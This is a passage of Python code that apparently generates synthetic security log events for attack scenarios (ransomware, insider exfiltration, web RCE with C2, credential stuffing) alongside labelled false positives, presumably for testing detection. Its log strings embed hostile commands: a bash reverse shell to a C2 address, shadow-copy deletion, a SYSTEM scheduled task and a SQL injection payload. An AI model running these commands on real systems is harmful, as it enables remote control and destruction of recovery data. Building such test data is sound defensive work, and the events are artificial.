            log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_NETWORK_OUTBOUND,
            raw_log=f"tcp {sip}->pool.minexmr.com:3333 stratum+tcp mining host={h}",
            src_ip=sip, dst_ip="109.201.133.195", dst_port=3333, host=h,
            protocol="tcp", direction=DIRECTION_OUTBOUND, action="allowed", severity="critical",
            tags=["tp10", "cryptominer", "c2"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=8),
            log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_IDS_ALERT,
            raw_log=f"ET TROJAN XMRig Cryptominer Stratum Protocol {sip}->pool.minexmr.com:3333",
            src_ip=sip, dst_ip="109.201.133.195", dst_port=3333, host=h,
            alert_name="ET TROJAN XMRig Cryptominer Activity", action="alerted", severity="critical",
            tags=["tp10", "cryptominer", "ids"],
        ))

        # ════════════════════════════════════════════════════════════════════
        # FP-01  Authorized Pentest: IT team scanning internal network
        # Actor: pentest-team on scanner-01 (EXPECTED: close / low confidence)
        # ════════════════════════════════════════════════════════════════════
        t = t_anchor(10)
        u, h = "pentest-svc", "scanner-01"
        sip = f"10.99.1.{random.randint(5,20)}"
        for i in range(5):
            evts.append(Event(
                timestamp=t + timedelta(seconds=i * 20),
                log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_NETWORK_OUTBOUND,
                raw_log=f"nmap scan src={sip} dst=10.0.0.{i+1} ports=22,80,443 AUTHORIZED pentest ticket=CHG-0042",
                src_ip=sip, host=h, protocol="tcp", direction=DIRECTION_OUTBOUND,
                action="allowed", severity="low",
                tags=["fp01", "authorized_pentest", "false_positive", "scheduled_scan"],
            ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=3),
            log_source=LOG_SOURCE_LINUX_AUTH, event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"sshd: Accepted for {u} from {sip} authorized pentest key host=linux-web-01",
            user=u, src_ip=sip, host="linux-web-01", action="success", severity="info",
            tags=["fp01", "authorized_pentest", "false_positive"],
        ))

        # ════════════════════════════════════════════════════════════════════
        # FP-02  Helpdesk Password Reset: user locked out, IT resets
        # Actor: helpdesk on WIN-HELPDESK-01 (EXPECTED: close)
        # ════════════════════════════════════════════════════════════════════
        t = t_anchor(11)
        u, h = "carol.white", "WIN-WS-021"
        sip_user = f"10.0.5.{random.randint(10,50)}"
        sip_hd   = f"10.0.99.{random.randint(5,20)}"
        for i in range(5):
            evts.append(Event(
                timestamp=t + timedelta(seconds=i * 60),
                log_source=LOG_SOURCE_WINDOWS_AUTH, event_type=EVENT_TYPE_AUTH_FAILURE,
                raw_log=f"Logon failure user={u} src={sip_user} host={h} reason=WrongPassword (user forgot password)",
                user=u, src_ip=sip_user, host=h, action="failed", severity="low",
                tags=["fp02", "password_reset", "false_positive", "benign"],
            ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=6),
            log_source=LOG_SOURCE_WINDOWS_AUTH, event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"Logon success user={u} src={sip_hd} host=WIN-HELPDESK-01 (helpdesk reset performed ticket=INC-5521)",
            user=u, src_ip=sip_hd, host="WIN-HELPDESK-01", action="success", severity="info",
            tags=["fp02", "password_reset", "false_positive", "helpdesk_reset"],
        ))

        # ════════════════════════════════════════════════════════════════════
        # FP-03  Scheduled Cloud Backup: large authorized upload
        # Actor: backup-agent on BACKUP-SRV-01 (EXPECTED: close)
        # ════════════════════════════════════════════════════════════════════
        t = t_anchor(12)
        u, h = "backup-agent", "BACKUP-SRV-01"
        sip, cloud = f"10.80.1.{random.randint(5,20)}", "52.96.188.100"
        evts.append(Event(
            timestamp=t,
            log_source=LOG_SOURCE_LINUX_AUTH, event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"sshd: Accepted publickey for {u} from {sip} (scheduled backup job cron=0 2 * * *)",
            user=u, src_ip=sip, host=h, action="success", severity="info",
            tags=["fp03", "scheduled_backup", "false_positive", "authorized"],
        ))
        for i in range(3):
            evts.append(Event(
                timestamp=t + timedelta(minutes=i * 5),
                log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_NETWORK_OUTBOUND,
                raw_log=f"Backup chunk {i+1}/3 {sip}->{cloud}:443 bytes={random.randint(200,600)}MB AUTHORIZED scheduled backup",
                src_ip=sip, dst_ip=cloud, dst_port=443, host=h, protocol="tcp",
                direction=DIRECTION_OUTBOUND, action="allowed", severity="info",
                tags=["fp03", "scheduled_backup", "false_positive", "authorized"],
            ))

        # ── random benign noise scattered across the window ─────────────────
        for _ in range(max(noise_events, 6)):
            ts = between(start, attack_end - timedelta(minutes=5))
            evts.append(Event(
                timestamp=ts,
                log_source=LOG_SOURCE_LINUX_AUTH,
                event_type=EVENT_TYPE_AUTH_SUCCESS,
                raw_log="Normal user login (business hours)",
                user=random.choice(["deploy", "monitor", "backup", "cron"]),
                host=random.choice(["build-01", "mon-02", "ci-03", "log-04"]),
                src_ip=f"10.0.0.{random.randint(2, 30)}",
                action="success", severity="info",
                tags=["noise", "benign"],
            ))

        evts.sort(key=lambda e: (e.timestamp or end, e.event_id))
        return evts

    # -----------------------------------------------------------------------
    # SCENARIO: ransomware_chain
    # Full story: Phishing click → credential theft → lateral movement →
    #             privilege escalation → shadow copy deletion → mass encryption
    # Kill-chain stages: Initial Access, Credential Access, Lateral Movement,
    #                    Privilege Escalation, Inhibit Recovery, Impact
    # -----------------------------------------------------------------------
    if scenario == "ransomware_chain":
        victim_user  = random.choice(["jsmith", "mwilson", "t.baker"])
        admin_user   = "administrator"
        workstation  = random.choice(["WIN-PC-047", "DESKTOP-A3B2", "LAPTOP-FIN01"])
        file_server  = random.choice(["FS-CORP-01", "SHARES-02", "NAS-PROD"])
        src_ip       = f"185.220.{random.randint(100,200)}.{random.randint(1,254)}"  # Tor exit / attacker
        internal_ip  = f"10.10.{random.randint(1,5)}.{random.randint(10,80)}"
        c2_ip        = f"91.92.{random.randint(200,254)}.{random.randint(1,100)}"

        attack_end   = end - timedelta(minutes=random.uniform(1, 3))
        t0           = attack_end - timedelta(minutes=22)

        # Stage 1 – Initial Access: phishing link clicked (inbound web)
        events.append(Event(
            timestamp=t0,
            log_source=LOG_SOURCE_WEB_WAF,
            event_type=EVENT_TYPE_WEB_ATTACK,
            raw_log=f"WAF ALLOW inbound GET /tracking?uid=<payload> src={src_ip} user-agent=Outlook",
            src_ip=src_ip, dst_ip=internal_ip, dst_port=80,
            host=workstation, protocol="http", direction=DIRECTION_INBOUND,
            action="allowed", severity="medium",
            tags=["synthetic", "ransomware_chain", "initial_access", "phishing"],
            extra={"mitre_technique": "T1566.002 - Spearphishing Link"},
        ))

        # Stage 2 – Credential Access: failed logins (credential harvesting via macro)
        for i in range(5):
            ts = t0 + timedelta(seconds=40 + i * 35 + random.randint(0, 10))
            events.append(Event(
                timestamp=ts,
                log_source=LOG_SOURCE_WINDOWS_AUTH,
                event_type=EVENT_TYPE_AUTH_FAILURE,
                raw_log=f"Microsoft-Windows-Security-Auditing: Logon failure user={victim_user} src={src_ip} workstation={workstation}",
                user=victim_user, src_ip=src_ip, host=workstation,
                action="failed", severity="high",
                tags=["synthetic", "ransomware_chain", "credential_access"],
                extra={"mitre_technique": "T1110 - Brute Force", "logon_type": "3"},
            ))

        # Stage 2b – Credential dumping: lsass access (Mimikatz-style)
        ts_dump = t0 + timedelta(minutes=4, seconds=random.randint(10, 30))
        events.append(Event(
            timestamp=ts_dump,
            log_source=LOG_SOURCE_WINDOWS_SYSMON,
            event_type=EVENT_TYPE_PROCESS_EXEC,
            raw_log=f"Sysmon EventID=10 SourceImage=C:\\Temp\\svhost.exe TargetImage=lsass.exe host={workstation}",
            user=victim_user, host=workstation, src_ip=internal_ip,
            action="executed", severity="critical",
            tags=["synthetic", "ransomware_chain", "credential_dumping", "lsass"],
            extra={"mitre_technique": "T1003.001 - LSASS Memory", "process": "svhost.exe→lsass.exe"},
        ))

        # Stage 3 – Auth success with stolen admin creds
        ts_admin_ok = ts_dump + timedelta(minutes=1, seconds=random.randint(20, 50))
        events.append(Event(
            timestamp=ts_admin_ok,
            log_source=LOG_SOURCE_WINDOWS_AUTH,
            event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"Microsoft-Windows-Security-Auditing: Logon success user={admin_user} src={internal_ip} host={workstation}",
            user=admin_user, src_ip=internal_ip, host=workstation,
            action="success", severity="high",
            tags=["synthetic", "ransomware_chain", "valid_accounts"],
            extra={"mitre_technique": "T1078 - Valid Accounts", "logon_type": "3"},
        ))

        # Stage 4 – Lateral Movement: SMB to file server
        ts_smb = ts_admin_ok + timedelta(minutes=2, seconds=random.randint(10, 40))
        events.append(Event(
            timestamp=ts_smb,
            log_source=LOG_SOURCE_NETWORK_IDS,
            event_type=EVENT_TYPE_LATERAL_MOVEMENT,
            raw_log=f"IDS: SMB lateral movement src={internal_ip} dst={file_server} port=445 share=ADMIN$",
            src_ip=internal_ip, host=file_server, dst_port=445,
            protocol="smb", direction=DIRECTION_OUTBOUND,
            action="allowed", severity="high",
            tags=["synthetic", "ransomware_chain", "lateral_movement", "smb"],
            extra={"mitre_technique": "T1021.002 - SMB/Windows Admin Shares", "share": "ADMIN$"},
        ))

        # Stage 4b – Auth success on file server (lateral)
        ts_fs_ok = ts_smb + timedelta(seconds=random.randint(15, 35))
        events.append(Event(
            timestamp=ts_fs_ok,
            log_source=LOG_SOURCE_WINDOWS_AUTH,
            event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"Logon success user={admin_user} src={internal_ip} host={file_server} logon_type=3",
            user=admin_user, src_ip=internal_ip, host=file_server,
            action="success", severity="high",
            tags=["synthetic", "ransomware_chain", "lateral_movement"],
            extra={"logon_type": "3"},
        ))

        # Stage 5 – Privilege Escalation: scheduled task / token impersonation
        ts_privesc = ts_fs_ok + timedelta(minutes=1, seconds=random.randint(10, 25))
        events.append(Event(
            timestamp=ts_privesc,
            log_source=LOG_SOURCE_WINDOWS_SYSMON,
            event_type=EVENT_TYPE_PRIVILEGE_ESCALATION,
            raw_log=f"Sysmon EventID=1 Image=schtasks.exe CommandLine='/create /tn Updater /sc onlogon /ru SYSTEM /tr C:\\Temp\\enc.exe' host={file_server}",
            user=admin_user, host=file_server, src_ip=internal_ip,
            action="executed", severity="critical",
            tags=["synthetic", "ransomware_chain", "privilege_escalation", "scheduled_task"],
            extra={"mitre_technique": "T1053.005 - Scheduled Task", "process": "schtasks.exe"},
        ))

        # Stage 6 – Inhibit Recovery: delete shadow copies
        ts_shadow = ts_privesc + timedelta(minutes=1, seconds=random.randint(5, 20))
        events.append(Event(
            timestamp=ts_shadow,
            log_source=LOG_SOURCE_WINDOWS_SYSMON,
            event_type=EVENT_TYPE_PROCESS_EXEC,
            raw_log=f"Sysmon EventID=1 Image=vssadmin.exe CommandLine='delete shadows /all /quiet' host={file_server} user=SYSTEM",
            user="SYSTEM", host=file_server, src_ip=internal_ip,
            action="executed", severity="critical",
            tags=["synthetic", "ransomware_chain", "inhibit_recovery", "vssadmin"],
            extra={"mitre_technique": "T1490 - Inhibit System Recovery", "process": "vssadmin.exe"},
        ))

        # Stage 7 – Impact: mass file encryption (burst of file rename events)
        for i in range(6):
            ts = ts_shadow + timedelta(seconds=10 + i * 18 + random.randint(0, 8))
            events.append(Event(
                timestamp=ts,
                log_source=LOG_SOURCE_ENDPOINT_EDR,
                event_type=EVENT_TYPE_RANSOMWARE,
                raw_log=f"EDR: Mass file rename detected host={file_server} files_affected={80 + i*25} ext=.locked user=SYSTEM",
                user="SYSTEM", host=file_server, src_ip=internal_ip,
                action="encrypt", severity="critical",
                tags=["synthetic", "ransomware_chain", "impact", "encryption"],
                extra={"mitre_technique": "T1486 - Data Encrypted for Impact",
                       "files_affected": 80 + i * 25, "extension": ".locked"},
            ))

        # Stage 8 – C2 callback (ransom key exchange)
        ts_c2 = ts_shadow + timedelta(seconds=random.randint(30, 60))
        events.append(Event(
            timestamp=ts_c2,
            log_source=LOG_SOURCE_NETWORK_IDS,
            event_type=EVENT_TYPE_IDS_ALERT,
            raw_log=f"IDS ALERT: Ransomware C2 key exchange src={internal_ip} dst={c2_ip}:443 bytes=4096",
            src_ip=internal_ip, dst_ip=c2_ip, dst_port=443,
            host=file_server, protocol="tcp", direction=DIRECTION_OUTBOUND,
            alert_name="ET RANSOMWARE Encrypted Key Exchange Observed",
            action="allowed", severity="critical",
            tags=["synthetic", "ransomware_chain", "c2", "ids"],
            extra={"mitre_technique": "T1041 - Exfiltration Over C2 Channel"},
        ))

        # Benign noise (earlier in window, different principals)
        for _ in range(max(noise_events, 4)):
            ts = between(start, t0 - timedelta(minutes=2))
            events.append(Event(
                timestamp=ts,
                log_source=LOG_SOURCE_WINDOWS_AUTH,
                event_type=EVENT_TYPE_AUTH_SUCCESS,
                raw_log="Windows logon noise - normal business hours",
                user=random.choice(["hruser1", "finance2", "support3"]),
                host=random.choice(["WIN-HR-01", "WIN-FIN-02", "WIN-SUP-03"]),
                src_ip=f"10.10.1.{random.randint(50, 120)}",
                action="success", severity="info",
                tags=["synthetic", "ransomware_chain", "noise"],
            ))

        events.sort(key=lambda e: (e.timestamp or end, e.event_id))
        return events

    # -----------------------------------------------------------------------
    # SCENARIO: insider_threat_exfil
    # Full story: Disgruntled employee → after-hours access → sensitive file
    #             harvest → data staged → exfiltrated to cloud storage
    # Kill-chain stages: Collection, Data Staged, Exfiltration
    # -----------------------------------------------------------------------
    if scenario == "insider_threat_exfil":
        insider       = random.choice(["d.jones", "r.patel", "c.nguyen"])
        workstation   = random.choice(["CORP-LT-088", "WIN-DEV-031", "LAPTOP-OPS09"])
        file_server   = random.choice(["FS-HR-CONF", "FS-FINANCE-01", "NAS-LEGAL"])
        internal_ip   = f"10.10.{random.randint(1,3)}.{random.randint(20,80)}"
        cloud_ip      = random.choice(["185.159.82.14", "104.21.56.77", "172.67.135.12"])
        cloud_domain  = random.choice(["mega.nz", "file.io", "transfer.sh"])

        attack_end    = end - timedelta(minutes=random.uniform(1, 3))
        t0            = attack_end - timedelta(minutes=18)

        # Stage 1 – Unusual after-hours auth success
        events.append(Event(
            timestamp=t0,
            log_source=LOG_SOURCE_WINDOWS_AUTH,
            event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"Logon success user={insider} host={workstation} src={internal_ip} time=02:14 (outside business hours)",
            user=insider, src_ip=internal_ip, host=workstation,
            action="success", severity="medium",
            tags=["synthetic", "insider_threat_exfil", "after_hours", "initial"],
            extra={"mitre_technique": "T1078 - Valid Accounts", "after_hours": True},
        ))

        # Stage 2 – Access to sensitive file server share
        ts_fs = t0 + timedelta(minutes=1, seconds=random.randint(20, 50))
        events.append(Event(
            timestamp=ts_fs,
            log_source=LOG_SOURCE_WINDOWS_SYSMON,
            event_type=EVENT_TYPE_FILE_ACCESS,
            raw_log=f"File share access: \\\\{file_server}\\Confidential\\HR_Salaries_2025.xlsx user={insider} src={internal_ip}",
            user=insider, src_ip=internal_ip, host=file_server,
            action="read", severity="medium",
            tags=["synthetic", "insider_threat_exfil", "file_access", "sensitive"],
            extra={"mitre_technique": "T1039 - Data from Network Shared Drive",
                   "path": f"\\\\{file_server}\\Confidential\\"},
        ))

        # Stage 3 – Bulk file download (multiple sensitive docs)
        sensitive_files = [
            "Employee_PII_Export.csv", "Exec_Compensation_Q4.xlsx",
            "M&A_Target_List_Confidential.docx", "IP_Patents_Draft.pdf",
            "Board_Minutes_2025.docx",
        ]
        for i, fname in enumerate(sensitive_files):
            ts = ts_fs + timedelta(seconds=30 + i * 45 + random.randint(0, 15))
            events.append(Event(
                timestamp=ts,
                log_source=LOG_SOURCE_WINDOWS_SYSMON,
                event_type=EVENT_TYPE_FILE_ACCESS,
                raw_log=f"Large file read: \\\\{file_server}\\Confidential\\{fname} size={random.randint(200,900)}KB user={insider}",
                user=insider, src_ip=internal_ip, host=file_server,
                action="read", severity="high",
                tags=["synthetic", "insider_threat_exfil", "bulk_download"],
                extra={"mitre_technique": "T1039 - Data from Network Shared Drive",
                       "filename": fname, "size_kb": random.randint(200, 900)},
            ))

        # Stage 4 – Data staging (7-Zip archive created in Temp)
        ts_stage = ts_fs + timedelta(minutes=5, seconds=random.randint(10, 30))
        events.append(Event(
            timestamp=ts_stage,
            log_source=LOG_SOURCE_WINDOWS_SYSMON,
            event_type=EVENT_TYPE_DATA_STAGING,
            raw_log=f"Process: 7z.exe a C:\\Users\\{insider}\\AppData\\Local\\Temp\\archive.zip C:\\Temp\\collect\\ host={workstation}",
            user=insider, host=workstation, src_ip=internal_ip,
            action="executed", severity="high",
            tags=["synthetic", "insider_threat_exfil", "data_staging", "7zip"],
            extra={"mitre_technique": "T1074.001 - Local Data Staging",
                   "process": "7z.exe", "archive": "archive.zip"},
        ))

        # Stage 5 – DNS query to cloud storage provider
        ts_dns = ts_stage + timedelta(seconds=random.randint(20, 50))
        events.append(Event(
            timestamp=ts_dns,
            log_source=LOG_SOURCE_DNS,
            event_type=EVENT_TYPE_DNS_QUERY,
            raw_log=f"DNS query: {cloud_domain} A? src={internal_ip} host={workstation} response={cloud_ip}",
            src_ip=internal_ip, dst_ip="10.10.0.1", dst_port=53,
            host=workstation, protocol="udp",
            action="resolved", severity="medium",
            tags=["synthetic", "insider_threat_exfil", "dns", "cloud_storage"],
            extra={"mitre_technique": "T1071.004 - DNS",
                   "queried_domain": cloud_domain, "resolved_ip": cloud_ip},
        ))

        # Stage 6 – Large outbound HTTPS transfer to cloud
        ts_exfil = ts_dns + timedelta(seconds=random.randint(15, 35))
        bytes_sent = random.randint(85, 250) * 1024 * 1024  # 85–250 MB
        events.append(Event(
            timestamp=ts_exfil,
            log_source=LOG_SOURCE_NETWORK_IDS,
            event_type=EVENT_TYPE_NETWORK_OUTBOUND,
            raw_log=f"Large HTTPS upload src={internal_ip} dst={cloud_ip}:443 bytes_out={bytes_sent} host={workstation}",
            src_ip=internal_ip, dst_ip=cloud_ip, dst_port=443,
            host=workstation, protocol="tcp", direction=DIRECTION_OUTBOUND,
            action="allowed", severity="high",
            tags=["synthetic", "insider_threat_exfil", "exfiltration", "large_transfer"],
            extra={"mitre_technique": "T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
                   "bytes_sent": bytes_sent, "destination_domain": cloud_domain},
        ))

        # Stage 7 – IDS alert: data exfil pattern
        ts_ids = ts_exfil + timedelta(seconds=random.randint(5, 15))
        events.append(Event(
            timestamp=ts_ids,
            log_source=LOG_SOURCE_NETWORK_IDS,
            event_type=EVENT_TYPE_IDS_ALERT,
            raw_log=f"IDS ALERT: Anomalous large outbound transfer to cloud storage src={internal_ip} dst={cloud_ip} bytes={bytes_sent}",
            src_ip=internal_ip, dst_ip=cloud_ip, dst_port=443,
            host=workstation, protocol="tcp", direction=DIRECTION_OUTBOUND,
            alert_name="ET POLICY Anomalous Large Upload to Cloud Storage",
            action="alerted", severity="high",
            tags=["synthetic", "insider_threat_exfil", "ids", "exfiltration"],
            extra={"mitre_technique": "T1048 - Exfiltration Over Alternative Protocol"},
        ))

        # Benign noise
        for _ in range(max(noise_events, 3)):
            ts = between(start, t0 - timedelta(minutes=2))
            events.append(Event(
                timestamp=ts,
                log_source=LOG_SOURCE_WINDOWS_AUTH,
                event_type=EVENT_TYPE_AUTH_SUCCESS,
                raw_log="Normal business hours logon",
                user=random.choice(["helpdesk1", "ops.svc", "backup.agent"]),
                host=random.choice(["WIN-HD-01", "SRV-OPS-02", "BACKUP-03"]),
                src_ip=f"10.10.2.{random.randint(10, 80)}",
                action="success", severity="info",
                tags=["synthetic", "insider_threat_exfil", "noise"],
            ))

        events.sort(key=lambda e: (e.timestamp or end, e.event_id))
        return events

    # -----------------------------------------------------------------------
    # SCENARIO: web_rce_c2
    # Full story: Attacker probes web app → SQL injection → RCE via file
    #             upload → reverse shell → C2 beacon → internal recon →
    #             lateral movement
    # Kill-chain stages: Reconnaissance, Initial Access, Execution,
    #                    Command & Control, Discovery, Lateral Movement
    # -----------------------------------------------------------------------
    if scenario == "web_rce_c2":
        web_server  = random.choice(["web-prod-01", "app-nginx-02", "api-gw-03"])
        db_server   = random.choice(["db-mysql-01", "db-pg-02"])
        internal_ip = f"10.20.{random.randint(1,3)}.{random.randint(5,50)}"
        attacker_ip = f"45.142.{random.randint(100,200)}.{random.randint(1,254)}"
        c2_ip       = f"194.165.{random.randint(16,50)}.{random.randint(1,200)}"

        attack_end  = end - timedelta(minutes=random.uniform(1, 3))
        t0          = attack_end - timedelta(minutes=20)

        # Stage 1 – Reconnaissance: web scanning / directory traversal
        for i in range(4):
            ts = t0 + timedelta(seconds=i * 22 + random.randint(0, 10))
            paths = ["/admin/config.php", "/.env", "/wp-admin/", "/../../../etc/passwd"]
            events.append(Event(
                timestamp=ts,
                log_source=LOG_SOURCE_WEB_WAF,
                event_type=EVENT_TYPE_WEB_ATTACK,
                raw_log=f"WAF DETECT path_traversal GET {paths[i]} src={attacker_ip} status=404 host={web_server}",
                src_ip=attacker_ip, dst_ip=internal_ip, dst_port=80,
                host=web_server, protocol="http", direction=DIRECTION_INBOUND,
                action="blocked", severity="medium",
                tags=["synthetic", "web_rce_c2", "recon", "scanning"],
                extra={"mitre_technique": "T1595 - Active Scanning", "path": paths[i]},
            ))

        # Stage 2 – SQL Injection detected by WAF
        ts_sqli = t0 + timedelta(minutes=2, seconds=random.randint(10, 30))
        events.append(Event(
            timestamp=ts_sqli,
            log_source=LOG_SOURCE_WEB_WAF,
            event_type=EVENT_TYPE_WEB_ATTACK,
            raw_log=f"WAF BLOCK SQL_INJECTION POST /login username=' OR 1=1-- src={attacker_ip} host={web_server}",
            src_ip=attacker_ip, dst_ip=internal_ip, dst_port=443,
            host=web_server, protocol="https", direction=DIRECTION_INBOUND,
            alert_name="WAF-SQLi-001: SQL Injection Detected",
            action="blocked", severity="high",
            tags=["synthetic", "web_rce_c2", "sqli", "initial_access"],
            extra={"mitre_technique": "T1190 - Exploit Public-Facing Application", "payload": "' OR 1=1--"},
        ))

        # Stage 3 – File upload RCE (WAF bypass / second request succeeds)
        ts_rce = ts_sqli + timedelta(minutes=1, seconds=random.randint(20, 50))
        events.append(Event(
            timestamp=ts_rce,
            log_source=LOG_SOURCE_WEB_WAF,
            event_type=EVENT_TYPE_WEB_ATTACK,
            raw_log=f"WAF ALLOW POST /upload?file=shell.php.jpg src={attacker_ip} status=200 host={web_server} size=8192",
            src_ip=attacker_ip, dst_ip=internal_ip, dst_port=443,
            host=web_server, protocol="https", direction=DIRECTION_INBOUND,
            alert_name="WAF-RCE-007: Suspicious File Upload (Double Extension)",
            action="allowed", severity="critical",
            tags=["synthetic", "web_rce_c2", "rce", "file_upload"],
            extra={"mitre_technique": "T1190 - Exploit Public-Facing Application",
                   "uploaded_file": "shell.php.jpg"},
        ))

        # Stage 4 – Webshell executes: process spawned from web worker
        ts_shell = ts_rce + timedelta(seconds=random.randint(15, 40))
        events.append(Event(
            timestamp=ts_shell,
            log_source=LOG_SOURCE_ENDPOINT_EDR,
            event_type=EVENT_TYPE_PROCESS_EXEC,
            raw_log=f"EDR: Suspicious child process nginx→bash host={web_server} cmd='bash -i >& /dev/tcp/{c2_ip}/4444 0>&1'",
            user="www-data", host=web_server, src_ip=internal_ip,
            action="executed", severity="critical",
            tags=["synthetic", "web_rce_c2", "webshell", "reverse_shell"],
            extra={"mitre_technique": "T1059.004 - Unix Shell",
                   "parent_process": "nginx", "child_process": "bash",
                   "command": f"bash -i >& /dev/tcp/{c2_ip}/4444 0>&1"},
        ))

        # Stage 5 – C2 beacon (outbound to attacker)
        ts_c2 = ts_shell + timedelta(seconds=random.randint(5, 15))
        events.append(Event(
            timestamp=ts_c2,
            log_source=LOG_SOURCE_NETWORK_IDS,
            event_type=EVENT_TYPE_NETWORK_OUTBOUND,
            raw_log=f"Outbound TCP established src={internal_ip} dst={c2_ip}:4444 host={web_server} protocol=tcp",
            src_ip=internal_ip, dst_ip=c2_ip, dst_port=4444,
            host=web_server, protocol="tcp", direction=DIRECTION_OUTBOUND,
            action="allowed", severity="critical",
            tags=["synthetic", "web_rce_c2", "c2", "reverse_shell"],
            extra={"mitre_technique": "T1071.001 - Web Protocols", "port": 4444},
        ))

        # Stage 6 – Internal network recon (scanning from compromised host)
        ts_scan = ts_c2 + timedelta(minutes=1, seconds=random.randint(10, 30))
        events.append(Event(
            timestamp=ts_scan,
            log_source=LOG_SOURCE_ENDPOINT_EDR,
            event_type=EVENT_TYPE_NETWORK_SCAN,
            raw_log=f"EDR: Network scan detected host={web_server} tool=nmap targets=10.20.0.0/24 ports=22,3306,5432,6379",
            user="www-data", host=web_server, src_ip=internal_ip,
            action="executed", severity="high",
            tags=["synthetic", "web_rce_c2", "recon", "network_scan"],
            extra={"mitre_technique": "T1046 - Network Service Discovery",
                   "targets": "10.20.0.0/24", "tool": "nmap"},
        ))

        # Stage 7 – IDS alert for C2 pattern
        ts_ids = ts_scan + timedelta(seconds=random.randint(10, 30))
        events.append(Event(
            timestamp=ts_ids,
            log_source=LOG_SOURCE_NETWORK_IDS,
            event_type=EVENT_TYPE_IDS_ALERT,
            raw_log=f"IDS ALERT: ET TROJAN Reverse Shell Beacon src={internal_ip} dst={c2_ip}:4444 flags=ESTABLISHED",
            src_ip=internal_ip, dst_ip=c2_ip, dst_port=4444,
            host=web_server, protocol="tcp", direction=DIRECTION_OUTBOUND,
            alert_name="ET TROJAN Reverse Shell / C2 Beacon Detected",
            action="alerted", severity="critical",
            tags=["synthetic", "web_rce_c2", "ids", "c2"],
            extra={"mitre_technique": "T1071.001 - Web Protocols"},
        ))

        # Stage 8 – Lateral movement: SSH to DB server using found credentials
        ts_lateral = ts_scan + timedelta(minutes=2, seconds=random.randint(15, 45))
        events.append(Event(
            timestamp=ts_lateral,
            log_source=LOG_SOURCE_LINUX_AUTH,
            event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"sshd: Accepted password for root from {internal_ip} port 22 ssh2 host={db_server}",
            user="root", src_ip=internal_ip, host=db_server,
            action="success", severity="critical",
            tags=["synthetic", "web_rce_c2", "lateral_movement", "ssh"],
            extra={"mitre_technique": "T1021.004 - SSH"},
        ))

        # Benign noise
        for _ in range(max(noise_events, 3)):
            ts = between(start, t0 - timedelta(minutes=2))
            events.append(Event(
                timestamp=ts,
                log_source=LOG_SOURCE_NETWORK_IDS,
                event_type=EVENT_TYPE_NETWORK_OUTBOUND,
                raw_log="Normal HTTPS outbound traffic",
                src_ip=f"10.20.0.{random.randint(5, 50)}",
                dst_ip="8.8.8.8", dst_port=443,
                host=random.choice(["web-prod-02", "app-static-01"]),
                protocol="tcp", direction=DIRECTION_OUTBOUND,
                action="allowed", severity="info",
                tags=["synthetic", "web_rce_c2", "noise"],
            ))

        events.sort(key=lambda e: (e.timestamp or end, e.event_id))
        return events

    # -----------------------------------------------------------------------
    # SCENARIO: credential_stuffing_ato
    # Full story: Bot-driven credential stuffing → one account hit →
    #             privilege escalation → new backdoor admin account created
    # Kill-chain stages: Initial Access, Credential Access, Privilege
    #                    Escalation, Persistence
    # -----------------------------------------------------------------------
    if scenario == "credential_stuffing_ato":
        # Victim account (one of many stuffed – the one that succeeds)
        victim_user  = random.choice(["sarah.hayes", "m.okonkwo", "j.pereira"])
        attacker_ip  = f"104.248.{random.randint(50,200)}.{random.randint(1,254)}"
        vpn_ip       = f"198.51.100.{random.randint(10,200)}"   # attacker via VPN post-ATO
        workstation  = random.choice(["DC-CORP-01", "AD-SRV-02"])
        internal_ip  = f"10.0.{random.randint(1,5)}.{random.randint(10,60)}"
        new_backdoor = "svc.helpdesk99"
        c2_ip        = f"77.91.{random.randint(68,200)}.{random.randint(1,254)}"

        attack_end   = end - timedelta(minutes=random.uniform(1, 3))
        t0           = attack_end - timedelta(minutes=20)

        # Stage 1 – Credential stuffing: many failed logins across accounts
        stuffed_accounts = [
            "john.doe", "jane.smith", "a.kumar", "p.wright",
            victim_user, "ops.user1", "it.admin2",
        ]
        for i, acct in enumerate(stuffed_accounts * 2):  # two rounds per account
            ts = t0 + timedelta(seconds=i * 12 + random.randint(0, 5))
            events.append(Event(
                timestamp=ts,
                log_source=LOG_SOURCE_WINDOWS_AUTH,
                event_type=EVENT_TYPE_AUTH_FAILURE,
                raw_log=f"Logon failure user={acct} src={attacker_ip} workstation=UNKNOWN failure_reason=bad_password",
                user=acct, src_ip=attacker_ip, host=workstation,
                action="failed", severity="medium",
                tags=["synthetic", "credential_stuffing_ato", "credential_stuffing"],
                extra={"mitre_technique": "T1110.004 - Credential Stuffing",
                       "failure_reason": "UnknownUserNameOrBadPassword"},
            ))

        # Stage 2 – Account takeover: one credential set matches
        ts_ato = t0 + timedelta(minutes=4, seconds=random.randint(10, 35))
        events.append(Event(
            timestamp=ts_ato,
            log_source=LOG_SOURCE_WINDOWS_AUTH,
            event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"Logon success user={victim_user} src={attacker_ip} workstation=UNKNOWN logon_type=3 (network)",
            user=victim_user, src_ip=attacker_ip, host=workstation,
            action="success", severity="critical",
            tags=["synthetic", "credential_stuffing_ato", "account_takeover"],
            extra={"mitre_technique": "T1078 - Valid Accounts", "logon_type": "3"},
        ))

        # Stage 3 – Unusual session: same account from new IP (VPN) seconds later
        ts_vpn = ts_ato + timedelta(seconds=random.randint(25, 60))
        events.append(Event(
            timestamp=ts_vpn,
            log_source=LOG_SOURCE_WINDOWS_AUTH,
            event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"Logon success user={victim_user} src={vpn_ip} workstation=UNKNOWN (concurrent session from new geolocation)",
            user=victim_user, src_ip=vpn_ip, host=workstation,
            action="success", severity="high",
